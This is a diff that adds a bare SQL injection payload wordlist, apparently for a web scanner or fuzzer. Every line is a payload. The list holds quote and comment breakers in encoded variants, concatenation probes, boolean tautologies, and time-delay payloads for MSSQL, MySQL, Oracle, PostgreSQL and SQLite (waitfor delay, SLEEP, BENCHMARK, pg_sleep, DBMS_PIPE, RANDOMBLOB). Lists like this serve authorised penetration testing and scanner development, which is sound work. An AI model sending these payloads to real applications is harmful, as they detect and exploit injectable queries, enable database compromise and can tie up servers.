@@ -1,0 +1,176 @@
+'
+%27
+\"
+%22
+#
+%23
+;
+%3B
+)
+*
+&apos;
+\u02BA
+%CA%BA
+\u0022
+\u02B9
+%CA%B9
+\u0027
+`+`
+'+'
+%CA%B9+%CA%B9
+\u0027+\u0027
+%CA%BA+%CA%BA
+\"+\"WsXeDC
+\u0022+\u0022
+`||`
+'||'
+%CA%B9||%CA%B9
+\"||\"
+\u0022||\u0022
+%CA%BA||%CA%BA
+' '
+%CA%B9 %CA%B9
+\u0027 \u0027
+%CA%BA %CA%BA
+\" \"
+\u0022 \u0022
+` `WsXeDC
+%CA%B9%20%CA%B9
+\u0027%20\u0027
+'%20'
+\"%20\"
+%CA%BA%20%CA%BA
+`%20`
+'%2B'
+%CA%B9%2B%CA%B9
+\u0027%2B\u0027
+\"%2B\"
+\u0022%2B\u0022
+`%2B`
+`+`WsXeDC
+'+'WsXeDC
+%CA%B9+%CA%B9WsXeDC
+\u0027+\u0027WsXeDC
+%CA%BA+%CA%BAWsXeDC
+\"+\"WsXeDC
+\u0022+\u0022WsXeDC
+`||`WsXeDC
+'||'WsXeDC
+%CA%B9||%CA%B9WsXeDC
+\"||\"WsXeDC
+\u0022||\u0022WsXeDC
+%CA%BA||%CA%BAWsXeDC
+' 'WsXeDC
+%CA%B9 %CA%B9WsXeDC
+\u0027 \u0027WsXeDC
+%CA%BA %CA%BAWsXeDC
+\" \"WsXeDC
+\u0022 \u0022WsXeDC
+` `WsXeDC
+%CA%B9%20%CA%B9WsXeDC
+\u0027%20\u0027WsXeDC
+'%20'WsXeDC
+\"%20\"WsXeDC
+%CA%BA%20%CA%BAWsXeDC
+`%20`WsXeDC
+'%2B'WsXeDC
+%CA%B9%2B%CA%B9WsXeDC
+\u0027%2B\u0027WsXeDC
+\"%2B\"WsXeDC
+\u0022%2B\u0022WsXeDC
+`%2B`WsXeDC
+or 'WsXeDC'='WsXeDC
+and 'WsXeDC'='null
+\"+\"WsXeDC
+\" \"WsXeDC
+\"%20\"WsXeDC
+\"%2B\"WsXeDC
+or 'WsXeDC'='WsXeDC
+and 'WsXeDC'='null
+\"+\"WsXeDC
+\" \"WsXeDC
+\"%20\"WsXeDC
+\"%2B\"WsXeDC
+or \"WsXeDC\"=\"WsXeDC
+and \"WsXeDC\"=\"null
+or 987=987
+and 987=789
+1;waitfor delay '0:0:15'--
+1);waitfor delay '0:0:15'--
+1';waitfor delay '0:0:15'--
+1\";waitfor delay '0:0:15'--
+1');waitfor delay '0:0:15'--
+1\");waitfor delay '0:0:15'--
+1));waitfor delay '0:0:15'--
++BENCHMARK(40000000,SHA1(1337))+
+'%2Bbenchmark(3200,SHA1(1))%2B'
+AND 25234=BENCHMARK(1000000,MD5('wsxedc'))
+' AND 25234=BENCHMARK(1000000,MD5('wsxedc'))
+\" AND 25234=BENCHMARK(1000000,MD5(\"wsxedc\"))
+RLIKE SLEEP(30)
+OR ELT(1500=1500,SLEEP(15))
+' OR ELT(1500=1500,SLEEP(15)) OR 'ARV'='ARV
+\" OR ELT(1500=1500,SLEEP(15)) OR \"ARV\"=\"ARV
+ AND sleep(15)--
+' AND sleep(15)--
+\" AND sleep(15)--
+ AND sleep(15) AND 'arv'='arv
+'  AND sleep(15) AND 'arv'='arv
+\"  AND sleep(15) AND \"arv\"=\"arv
+AND 1500=DBMS_PIPE.RECEIVE_MESSAGE('asdf',15) 
+' AND 1500=DBMS_PIPE.RECEIVE_MESSAGE('asdf',15) 
+\" AND 1500=DBMS_PIPE.RECEIVE_MESSAGE(\"asdf\",15) 
+AND 1239=(SELECT 1239 FROM PG_SLEEP(15))
+AND 1239=(SELECT COUNT(*) FROM GENERATE_SERIES(1,15000000))
+' AND 1239=(SELECT 1239 FROM PG_SLEEP(15)) and 'arv'='arv
+\" AND 1239=(SELECT 1239 FROM PG_SLEEP(15)) and \"arv\"=\"arv
+' AND 1239=(SELECT COUNT(*) FROM GENERATE_SERIES(1,15000000))  and 'arv'='arv
+\" AND 1239=(SELECT COUNT(*) FROM GENERATE_SERIES(1,15000000))  and \"arv\"=\"arv
+AND 1239=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(123900000000/2))))
+' AND 1239=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(123900000000/2))))  and 'arv'='arv
+\" AND 1239=LIKE(\"ABCDEFG\",UPPER(HEX(RANDOMBLOB(123900000000/2))))  and \"arv\"=\"arv
+sleep(__TIME__)#
+1 or sleep(15)#
+\" or sleep(15)#
+' or sleep(15)#
+\" or sleep(15)=\"
+' or sleep(15)='
+1) or sleep(15)#
+\") or sleep(15)=\"
+') or sleep(15)='
+1)) or sleep(15)#
+\")) or sleep(15)=\"
+')) or sleep(15)='
+;waitfor delay '0:0:15'--
+);waitfor delay '0:0:15'--
+';waitfor delay '0:0:15'--
+\";waitfor delay '0:0:15'--
+');waitfor delay '0:0:15'--
+\");waitfor delay '0:0:15'--
+));waitfor delay '0:0:15'--
+'));waitfor delay '0:0:15'--
+\"));waitfor delay '0:0:15'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+\" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+\") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+\")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(15)--
+1 or pg_sleep(15)--
+\" or pg_sleep(15)--
+' or pg_sleep(15)--
+1) or pg_sleep(15)--
+\") or pg_sleep(15)--
+') or pg_sleep(15)--
+1)) or pg_sleep(15)--
+\")) or pg_sleep(15)--
+')) or pg_sleep(15)--
+1; SELECT pg_sleep(10);
+--
+#
+/*
